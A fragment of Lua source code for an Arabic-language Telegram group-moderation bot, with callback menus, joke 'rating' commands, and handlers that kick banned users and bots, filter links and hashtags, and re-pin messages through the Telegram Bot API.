},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if Text == '/add' then
if not Constructor(data) then
local notText = '🚫 عذرا الاوامر هذه لا تخصك'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
*اهلا عزيزي انت في اضافات البوت*
*لتفعيل او تعطيل الاضافات*
*ارسل تفعيل/تعطيل الاضافات*
*ٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴٴ*
* يمكنك معرفة حاله تفعيل الاضافات *
* من خلال ارسال ( حاله الاضافات ) *
*ٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ*
*يمكنك تصفح الاضافات من خلال*
*الكيبورد الموجود في الأسفل*
*ٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ*
➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽. ](t.me/WaTaNTeaM)➤
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'كتم الاسماء', callback_data="/mute-name"},{text = 'التوحيد', callback_data="/WaTaN"},{text = 'تنبيه الأسماء', callback_data="/change-names"},
},
{
{text = 'تنبيه المعرف', callback_data="/change-id"},{text = 'تنبيه الصور', callback_data="/change-photo"},
},
{
{text = '𝐖𝐀𝐓𝐀𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/WaTaNTeaM"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if data.ID == "UpdateNewMessage" then  -- new msg
msg = data.message_
text = msg.content_.text_
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
database:del(bot_id..'Spam:Texting'..msg.sender_user_id_) 
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and database:get(bot_id.."Del:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_) == 'true' then
local NewCmmd = database:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..text)
if NewCmmd then
database:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..text)
database:del(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
database:srem(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,'✯︙تم حذف الامر')  
else
send(msg.chat_id_, msg.id_,'✯︙لا يوجد امر بهذا الاسم')  
end
database:del(bot_id.."Del:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_)
return false
end 
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ ----- 
if data.message_.content_.text_ then
local NewCmmd = database:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if (text and text == "تعطيل اوامر التحشيش") and ChanSub(msg) then 
send(msg.chat_id_, msg.id_, '✯︙تم تعطيل اوامر التحشيش')
database:set(bot_id.."Fun_Bots:"..msg.chat_id_,"true")
end
if (text and text == "تفعيل اوامر التحشيش") and ChanSub(msg) then 
send(msg.chat_id_, msg.id_, '  ✯︙تم تفعيل اوامر التحشيش')
database:del(bot_id.."Fun_Bots:"..msg.chat_id_)
end
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'وطن')
if not database:get(bot_id.."Fun_Bots:"..msg.chat_id_) then
if text ==  ""..Name_Bot..' شنو رئيك بهذا' and ChanSub(msg) and tonumber(msg.reply_to_message_id_) > 0 then     
function FunBot(extra, result, success) 
local Fun = {'لوكي وزاحف من ساع زحفلي وحضرته 😒','خوش ولد و ورده مال الله 💋🙄','يلعب ع البنات 🙄', 'ولد زايعته الكاع 😶🙊','صاك يخبل ومعضل ','محلو وشواربه جنها مكناسه 😂🤷🏼‍♀️','اموت عليه 🌝','هوه غير ا��حب مال اني 🤓❤️','مو خوش ولد صراحه ☹️','ادبسز وميحترم البنات  ', 'فد واحد قذر 🙄😒','ماطيقه كل ما اكمشه ريحته جنها بخاخ بف باف مال حشرات 😂🤷‍♀️','مو خوش ولد 🤓' } 
send(msg.chat_id_, result.id_,''..Fun[math.random(#Fun)]..'')   
end   
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunBot, nil)
return false
end  
if text == ""..Name_Bot..' تحب هذا' and ChanSub(msg) and tonumber(msg.reply_to_message_id_) > 0 then    
function FunBot(extra, result, success) 
local Fun = {'الكبد مال اني ','يولي ماحبه ',' لٱ ايع ','بس لو الكفها اله اعضها 💔','ماخب مطايه اسف','اكلك ۿذﭑ يكلي احبكك لولا ﭑݩٺ شتكول  ','ئووووووووف اموت ع ربه ','ايععععععععع','بلعباس اعشكك','ماحب مخابيل','احبب ميدو وبس','لٱ ماحبه','بله هاي جهره تكلي تحبهه ؟ ','بربك ئنته والله فارغ وبطران وماعدك شي تسوي جاي تسئلني احبهم لولا','افبس حبيبي هذا' } 
send(msg.chat_id_,result.id_,''..Fun[math.random(#Fun)]..'') 
end  
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunBot, nil)
return false
end    
end
if text and text:match('^'..Name_Bot..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..Name_Bot..' ','')
end
if text and text:match('^'..Name_Bot..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..Name_Bot..' ','')
end
if text == "نسبه الحب" and ChanSub(msg) or text == "نسبه حب" and ChanSub(msg) or text == 'نسبة الحب' and ChanSub(msg) and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:lov'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":lov_Bots"..msg.chat_id_,"sendlove")
Text = 'ارسل اسمك واسم الشخص الثاني،  \n مثال روظي و وروان'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="نسبه الحب" and database:get(bot_id..":"..msg.sender_user_id_..":lov_Bots"..msg.chat_id_) == "sendlove" then
num = {"10","20","30","35","75","34","66","82","23","19","55","8","63","32","27","89","99","98","3","80","49","100","6","0",};
sendnum = num[math.random(#num)]
sl = 'نسبه حب '..text..' هي : '..sendnum..'%'
send(msg.chat_id_, msg.id_,sl) 
database:del(bot_id..":"..msg.sender_user_id_..":lov_Bots"..msg.chat_id_)
end
if text == "نسبه الكره" and ChanSub(msg) or text == "نسبه كره" and ChanSub(msg) and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:krh'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":krh_Bots"..msg.chat_id_,"sendkrhe")
Text = 'ارسل اسمك واسم الشخص الثاني،  \n مثال اسد و لبوى'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="نسبه الكره" and database:get(bot_id..":"..msg.sender_user_id_..":krh_Bots"..msg.chat_id_) == "sendkrhe" then
num = {"10","20","30","35","75","34","66","82","23","19","55","8","63","32","27","89","99","98","3","80","8","100","6","0",};
sendnum = num[math.random(#num)]
sl = 'نسبه كره '..text..' هي : '..sendnum..'%'
send(msg.chat_id_, msg.id_,sl) 
database:del(bot_id..":"..msg.sender_user_id_..":krh_Bots"..msg.chat_id_)
end
if text == "نسبه رجوله" and ChanSub(msg) or text == "نسبه الرجوله" and ChanSub(msg) and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:rjo'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":rjo_Bots"..msg.chat_id_,"sendrjoe")
Text = 'ارسل اسم الشخص الذي تريد قياس نسبه رجولته \n مثال مصطفئ'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="نسبه رجوله" and database:get(bot_id..":"..msg.sender_user_id_..":rjo_Bots"..msg.chat_id_) == "sendrjoe" then
numj = {"10","20","30","35","75","34","66","82","23","19","55","80","63","32","27","89","99","98","79","100","8","3","6","0",};
sendnuj = numj[math.random(#numj)]
xl = 'نسبه رجوله '..text..' هي : \n '..sendnuj..'%'
send(msg.chat_id_, msg.id_,xl) 
database:del(bot_id..":"..msg.sender_user_id_..":rjo_Bots"..msg.chat_id_)
end
if text == "نسبه الانوثه" and ChanSub(msg) or text == "نسبه انوثه" and ChanSub(msg) and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:ano'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":ano_Bots"..msg.chat_id_,"sendanoe")
Text = 'ارسل اسم الشخص الذي تريد قياس نسبه انوثتها \n مثال روان'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="نسبه الانوثه" and database:get(bot_id..":"..msg.sender_user_id_..":ano_Bots"..msg.chat_id_) == "sendanoe" then
numj = {"10","20","30","35","75","34","66","82","23","19","55","80","63","32","27","89","99","98","79","100","8","3","6","0",};
sendnuj = numj[math.random(#numj)]
xl = 'نسبه الانوثه لـ'..text..' هي : \n '..sendnuj..'%'
send(msg.chat_id_, msg.id_,xl) 
database:del(bot_id..":"..msg.sender_user_id_..":ano_Bots"..msg.chat_id_)
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.sender_user_id_ and Muted_User(msg.chat_id_,msg.sender_user_id_) then 
DeleteMessage(msg.chat_id_, {[0] = msg.id_})  
return false  
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.sender_user_id_ and Ban_User(msg.chat_id_,msg.sender_user_id_) then 
chat_kick(msg.chat_id_,msg.sender_user_id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false  
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and Ban_User(msg.chat_id_,msg.content_.members_[0].id_) then 
chat_kick(msg.chat_id_,msg.content_.members_[0].id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.sender_user_id_ and GBan_User(msg.sender_user_id_) then 
chat_kick(msg.chat_id_,msg.sender_user_id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false 
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.sender_user_id_ and Gmute_User(msg.sender_user_id_) then 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false 
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and GBan_User(msg.content_.members_[0].id_) then 
chat_kick(msg.chat_id_,msg.content_.members_[0].id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_})  
end 
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.content_.ID == "MessageChatAddMembers" then  
database:set(bot_id.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and not Mod(msg) and Bots == "kick" then   
https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
WaTaN = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(WaTaN)
if Json_Info.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_})
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah) local admins = tah.members_ for i=0 , #admins do if tah.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not is_mod(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
local Bots = database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and not Mod(msg) and Bots == "del" then   
WaTaN = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(WaTaN)
if Json_Info.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_})
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah) local admins = tah.members_ for i=0 , #admins do if tah.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not is_mod(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
end
if msg.content_.ID == 'MessagePinMessage' then
if Constructor(msg) then 
database:set(bot_id..'Pin:Id:Msg'..msg.chat_id_,msg.content_.message_id_)
else
local Msg_Pin = database:get(bot_id..'Pin:Id:Msg'..msg.chat_id_)
if Msg_Pin and database:get(bot_id.."lockpin"..msg.chat_id_) then
PinMessage(msg.chat_id_,Msg_Pin)
end
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
if database:get(bot_id..'lock:tagservr'..msg.chat_id_) then  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false
end    
end   
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(bot_id) then 
database:srem(bot_id..'Chek:Groups',msg.chat_id_)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
if not DevWaTaN(msg) then
sendText(SUDO,"✯︙تم طرد البوت من المجموعه : \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n✯︙بواسطة : "..Name.."\n✯︙اسم المجموعه : ["..NameChat.."]\n✯︙ايدي المجموعه : \n`"..msg.chat_id_.."`",0,'md')
end
end,nil)
end,nil)
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
SourceWaTaN(data.message_,data)
plugin_WaTaN(data.message_)
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ then
database:set(bot_id..'user:Name'..msg.sender_user_id_,(data.username_))
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if tonumber(data.id_) == tonumber(bot_id) then
return false
end
end,nil)   
end
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.message_id_)},function(extra, result, success)
database:incr(bot_id..'edits'..result.chat_id_..result.sender_user_id_)
local Text = result.content_.text_
if database:get(bot_id.."lock_edit_med"..msg.chat_id_) and not Text and not BasicConstructor(result) then
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local username = data.username_
local name = data.first_name_
local iduser = data.id_
local users = ('[@'..data.username_..']' or iduser)
local list = database:smembers(bot_id..'Constructor'..msg.chat_id_)
t = "\n✯︙شخص ما يحاول تعديل الميديا \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد ادمن"
end
send(msg.chat_id_,0,''..t..'\nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n✯︙تم التعديل على الميديا\n✯︙الشخص الي قام بالتعديل\n✯︙ايدي الشخص ◂ '..result.sender_user_id_..'\n✯︙معرف الشخص»{ '..users..' }') 
end,nil)
DeleteMessage(msg.chat_id_,{[0] = msg.message_id_}) 
end
local text = result.content_.text_
if not Mod(result) then
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("[hH][tT][tT][pP][sT]") or text and text:match("[tT][eE][lL][eE][gG][rR][aA].[Pp][Hh]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa].[Pp][Hh]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("(.*)(@)(.*)") then
if database:get(bot_id.."lock:user:name"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("@") then
if database:get(bot_id.."lock:user:name"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("(.*)(#)(.*)") then
if database:get(bot_id.."lock:hashtak"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("#") then
if database:get(bot_id.."lock:user:name"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
local WaTaNAbot = database:get(bot_id.."WaTaN1:Add:Filter:Rp2"..text..result.chat_id_)   
if WaTaNAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ✯︙العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n✯︙["..WaTaNAbot.."] \n") 
else
send(msg.chat_id_,0," ✯︙العضو : {["..data.first_name_.."](t.me/WaTaNTeaM)}\n✯︙["..WaTaNAbot.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("/") then
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end 
end 
if text and text:match("(.*)(/)(.*)") then
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text then
local WaTaN1_Msg = database:get(bot_id.."WaTaN1:Add:Filter:Rp2"..text..result.chat_id_)   
if WaTaN1_Msg then    
send(msg.chat_id_, msg.id_," ✯︙"..WaTaN1_Msg)
DeleteMessage(result.chat_id_, {[0] = data.message_id_})     
return false
end
end
end
end,nil)
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----

elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then 
local list = database:smembers(bot_id.."User_Bot") 
for k,v in pairs(list) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
end         
local list = database:smembers(bot_id..'Chek:Groups') 
for k,v in pairs(list) do 
tdcli_function({ID='GetChat',chat_id_ = v
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
database:srem(bot_id..'Chek:Groups',v)  
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
database:srem(bot_id..'Chek:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
database:srem(bot_id..'Chek:Groups',v)  
end
if data and data.code_ and data.code_ == 400 then
database:srem(bot_id..'Chek:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
database:sadd(bot_id..'Chek:Groups',v)  
end 
end,nil)
end

elseif (data.ID == "UpdateMessageSendSucceeded") then
local msg = data.message_
local text = msg.content_.text_
local Get_Msg_Pin = database:get(bot_id..'Msg:Pin:Chat'..msg.chat_id_)
if Get_Msg_Pin ~= nil then
if text == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) if d.ID == 'Ok' then;database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if Get_Msg_Pin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
if msg.content_.animation_.animation_.persistent_id_ == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.photo_) then
if msg.content_.photo_.sizes_[0] then
id_photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
id_photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
id_photo = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
id_photo = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
if id_photo == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
end


